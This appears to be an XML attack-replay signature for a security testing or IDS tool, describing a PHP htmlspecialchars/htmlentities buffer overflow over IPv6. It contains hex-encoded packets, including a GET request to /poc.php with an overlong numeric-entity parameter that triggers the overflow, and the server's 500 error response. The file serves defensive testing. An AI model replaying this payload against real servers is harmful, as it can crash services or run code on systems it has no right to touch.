@@ -1,0 +1,107 @@
+<?xml version="1.0" encoding="utf-8"?>
+<threatSignature>
+  <ThreatProperties>
+    <ExecDesc display="true" value="PHP htmlspecialchars htmlentities Buffer Overflow(IPV6 Version)"/>
+    <EngDesc display="true" value="A buffer overflow vulnerability exists in PHP. The vulnerability is due to an error while processing numeric entities by&#13;&#10;the htmlspecialchars and htmlentities PHP functions. A remote attacker could exploit this vulnerability by sending&#13;&#10;a malicious request to a web application that uses these functions.&#13;&#10;A successful attack attempt could result in the execution of arbitrary code in the security context of the HTTP&#13;&#10;service, which is normally user &quot;nobody&quot; for Apache on Linux. Configurations where the HTTP server runs as root&#13;&#10;or SYSTEM are uncommon."/>
+    <Intent display="true">
+      <item value="Buffer_Overflow"/>
+    </Intent>
+    <Protocol display="true" value="IPV6,HTTP,HTTPS"/>
+    <Type_Of_Equipment display="true">
+      <item value="Application"/>
+    </Type_Of_Equipment>
+    <Known_Vendors_Affected display="true">
+      <item value="PHP_Group"/>
+    </Known_Vendors_Affected>
+    <Known_Products_Affected display="true">
+      <item value="PHP"/>
+    </Known_Products_Affected>
+    <Known_Versions_Affected display="true">
+      <item value="5.4SVN-2012-02-03"/>
+    </Known_Versions_Affected>
+    <Credit display="true" value="TSL20120216-08"/>
+    <CVEID display="true" value=""/>
+    <bugtraqID display="true" value=""/>
+    <OSVDB display="true" value=""/>
+    <Author display="true" value=""/>
+    <ID display="true" value="2b64d9a7716f24ff61031a9533bd8735"/>
+    <Revision display="true" value="1"/>
+    <Safe display="true" value=""/>
+    <ServerSideAttack display="true" value=""/>
+    <SoftwareRevision display="true" value=""/>
+    <Suite display="true" value=""/>
+    <RunOnce display="false" value=""/>
+    <Valid_Traffic display="false" value=""/>
+    <AccessVector display="false" value="Network"/>
+    <AccessComplexity display="false" value="Medium"/>
+    <Authentication display="false" value="not-required"/>
+    <ConfImpact display="false" value="partial"/>
+    <IntegImpact display="false" value="partial"/>
+    <AvailImpact display="false" value="partial"/>
+    <ImpactBias display="false" value="normal"/>
+    <FirstAdded display="false" value=""/>
+    <LastModified display="false" value="634685296321858675"/>
+    <SigStyle display="false" value=""/>
+    <targetNode display="false" value=""/>
+    <SigProtocol display="false" value=""/>
+    <Rate display="false" value=""/>
+    <Regex display="false" value=""/>
+    <Created value="1332927044" display="true"/>
+  </ThreatProperties>
+  <Variables>
+    <NamedVar name="destIP" type="ImperfectControls.IPv6Address" value="null" index="E"/>
+    <NamedVar name="HTTPdestPort" type="ImperfectControls.Port" value="null" index="F"/>
+  </Variables>
+  <Loops>
+    <for index="A">
+      <for index="E"/>
+      <for index="F"/>
+    </for>
+    <for index="B">
+      <for index="E"/>
+      <for index="F"/>
+    </for>
+    <for index="C">
+      <for index="E"/>
+      <for index="F"/>
+    </for>
+    <for index="D">
+      <for index="E"/>
+      <for index="F"/>
+    </for>
+  </Loops>
+  <PostScript/>
+  <Output index="A" Count="">
+    <Ethernet srcMac="00:0C:29:3A:A1:49" destMac="00:0C:29:DE:6A:C0" pktType="0800">
+      <IPv6 Version="06" Priority="00" Flow-Label="000000" Payload-Length="04D8" Next-Header="3A" Hop-Limit="40" Source-Address="3FFE::0200:FF:FE00:2" Destination-Address="$destIP">
+        <TCP srcPort="1171" destPort="$HTTPdestPort" SeqNumber="ED411460" AckNumber="3250B6BD" HeaderLength="05" WindowSize="FAF0" Checksum="E709" UrgentPointer="0000" Options="" Payload="474554202F706F632E70687020485454502F312E310D0A486F73743A203137322E31362E382E3132330D0A557365722D4167656E743A204D6F7A696C6C612F352E30202857696E646F77733B20553B2057696E646F7773204E5420352E313B20656E2D55533B2072763A312E392E302E313329204765636B6F2F323030393037333032322046697265666F782F332E302E313320282E4E455420434C5220332E352E3330373239290D0A4163636570743A20746578742F68746D6C2C6170706C69636174696F6E2F7868746D6C2B786D6C2C6170706C69636174696F6E2F786D6C3B713D302E392C2A2F2A3B713D302E380D0A4163636570742D4C616E67756167653A20656E2D75732C656E3B713D302E350D0A4163636570742D456E636F64696E673A20677A69702C6465666C6174650D0A4163636570742D436861727365743A2049534F2D383835392D312C7574662D383B713D302E372C2A3B713D302E370D0A4B6565702D416C6976653A203330300D0A436F6E6E656374696F6E3A206B6565702D616C6976650D0A0D0A" CWR="false" ECE="false" URG="false" ACK="true" PSH="true" RST="false" SYN="false" FIN="false" RES1="false" RES2="false" RES3="false" RES4="false"/>
+      </IPv6>
+    </Ethernet>
+  </Output>
+  <Output index="C" Count="">
+    <Ethernet srcMac="00:0C:29:3A:A1:49" destMac="00:0C:29:DE:6A:C0" pktType="0800">
+      <IPv6 Version="06" Priority="00" Flow-Label="000000" Payload-Length="04D8" Next-Header="3A" Hop-Limit="40" Source-Address="3FFE::0200:FF:FE00:2" Destination-Address="$destIP">
+        <TCP srcPort="1171" destPort="$HTTPdestPort" SeqNumber="ED4115EE" AckNumber="3250B85C" HeaderLength="05" WindowSize="F951" Checksum="4A8D" UrgentPointer="0000" Options="" Payload="474554202F706F632E7068703F737472696E673D2532322532322532322532322532322532322532322532322532322532322532322532322532322532322532322532362532333030303030303030303030303030303030303030303030303030303030303030303030303030303030303030303131313125334220485454502F312E310D0A486F73743A203137322E31362E382E3132330D0A557365722D4167656E743A204D6F7A696C6C612F352E30202857696E646F77733B20553B2057696E646F7773204E5420352E313B20656E2D55533B2072763A312E392E302E313329204765636B6F2F323030393037333032322046697265666F782F332E302E313320282E4E455420434C5220332E352E3330373239290D0A4163636570743A20746578742F68746D6C2C6170706C69636174696F6E2F7868746D6C2B786D6C2C6170706C69636174696F6E2F786D6C3B713D302E392C2A2F2A3B713D302E380D0A4163636570742D4C616E67756167653A20656E2D75732C656E3B713D302E350D0A4163636570742D456E636F64696E673A20677A69702C6465666C6174650D0A4163636570742D436861727365743A2049534F2D383835392D312C7574662D383B713D302E372C2A3B713D302E370D0A4B6565702D416C6976653A203330300D0A436F6E6E656374696F6E3A206B6565702D616C6976650D0A526566657265723A20687474703A2F2F3137322E31362E382E3132332F706F632E7068700D0A0D0A" CWR="false" ECE="false" URG="false" ACK="true" PSH="true" RST="false" SYN="false" FIN="false" RES1="false" RES2="false" RES3="false" RES4="false"/>
+      </IPv6>
+    </Ethernet>
+  </Output>
+  <Input>
+    <Ethernet/>
+  </Input>
+  <ServerSide display="1,3">
+    <Output index="B" Count="">
+      <Ethernet srcMac="00:0C:29:DE:6A:C0" destMac="00:0C:29:3A:A1:49" pktType="0800">
+        <IPv6 Version="06" Priority="00" Flow-Label="000000" Payload-Length="04D8" Next-Header="3A" Hop-Limit="40" Source-Address="$destIP" Destination-Address="3FFE::0200:FF:FE00:1">
+          <TCP srcPort="$HTTPdestPort" destPort="1171" SeqNumber="3250B6BD" AckNumber="ED4115EE" HeaderLength="05" WindowSize="3CB8" Checksum="5D2F" UrgentPointer="0000" Options="" Payload="485454502F312E3120323030204F4B0D0A446174653A205475652C2032382046656220323031322032303A35323A303420474D540D0A5365727665723A204170616368652F322E322E313720285562756E7475290D0A582D506F77657265642D42793A205048502F352E342E305243382D6465760D0A566172793A204163636570742D456E636F64696E670D0A436F6E74656E742D456E636F64696E673A20677A69700D0A436F6E74656E742D4C656E6774683A203134350D0A4B6565702D416C6976653A2074696D656F75743D31352C206D61783D3130300D0A436F6E6E656374696F6E3A204B6565702D416C6976650D0A436F6E74656E742D547970653A20746578742F68746D6C0D0A0D0A1F8B0800000000000003B3C928C9CDB1E3B229B00B71F5090D56084E4D2E2DCA2CA954F0494C2AB6D12FB0E3E2B249CB2FCAB5E3E2B4C9CC2B282D5128A92C48B5552A49AD285152C84BCC05B28B4B8A32F3D29514CA12734A536DD59550815A626E81B20129C01008ACD5158A33AB80A6991BA8EBA35B5E5C9A949B59A20474B63EC46D4006C41F0060FE2A27CF000000" CWR="false" ECE="false" URG="false" ACK="true" PSH="true" RST="false" SYN="false" FIN="false" RES1="false" RES2="false" RES3="false" RES4="false"/>
+        </IPv6>
+      </Ethernet>
+    </Output>
+    <Output index="D" Count="">
+      <Ethernet srcMac="00:0C:29:DE:6A:C0" destMac="00:0C:29:3A:A1:49" pktType="0800">
+        <IPv6 Version="06" Priority="00" Flow-Label="000000" Payload-Length="04D8" Next-Header="3A" Hop-Limit="40" Source-Address="$destIP" Destination-Address="3FFE::0200:FF:FE00:1">
+          <TCP srcPort="$HTTPdestPort" destPort="1171" SeqNumber="3250B85C" AckNumber="ED411811" HeaderLength="05" WindowSize="401A" Checksum="5F60" UrgentPointer="0000" Options="" Payload="485454502F312E312035303020496E7465726E616C20536572766572204572726F720D0A446174653A205475652C2032382046656220323031322032303A35323A303920474D540D0A5365727665723A204170616368652F322E322E313720285562756E7475290D0A566172793A204163636570742D456E636F64696E670D0A436F6E74656E742D456E636F64696E673A20677A69700D0A436F6E74656E742D4C656E6774683A203430310D0A436F6E6E656374696F6E3A20636C6F73650D0A436F6E74656E742D547970653A20746578742F68746D6C3B20636861727365743D69736F2D383835392D310D0A0D0A1F8B080000000000000375523D6FDB3010DDF92BAE995220116D076D320842DBD8450C24A9812843C713753609903C87A41CF8DF9794E5B44B1741D2BDAFE363FD69F9EBBEFDBD59C143FBF4089BD71F8FEB7BB8B89672BD6A7F4AB96C97A7C9A29A49B97ABE6844AD93B34DAD09FBFC914CB2D47C99CD60ED13058F165E281C28C02A040EB53C01442D4742DD717F2C1AF3E63FF83C11F5BE6935413C0DC82B1E0A987A400FE6CCA342000EC299A8D86FCD6E08980CFB8CEAE11D230C1E3B4B901814BBBDA544E2C84380406F03C554D5723F9A6D2C61A40CF2095582F4D71B7B67BC89290B73B812F04E9DC398037CB3ACD06A8E6974337ECBC115A603DE8E0AC9381A5FA69C4A0D21AF70250A1EFD3169E37790F380333B9D40E381A0675F4898C0E171FC25140E316FFEA1F491FA89034DC6D3DA1D0F25BD899367D1E808F080C6969310C6FFBBDC0964793749EA901FD8F781626CBEEF5169928B6A51CD6FE1F2B5CB150C9FCF65E580F3DB3CF95ADD55F3C50D6C3824B89BD5F24CCF858F55E742CB75117F00127CD13B69020000" CWR="false" ECE="false" URG="false" ACK="true" PSH="true" RST="false" SYN="false" FIN="false" RES1="false" RES2="false" RES3="false" RES4="false"/>
+        </IPv6>
+      </Ethernet>
+    </Output>
+  </ServerSide>
+</threatSignature>
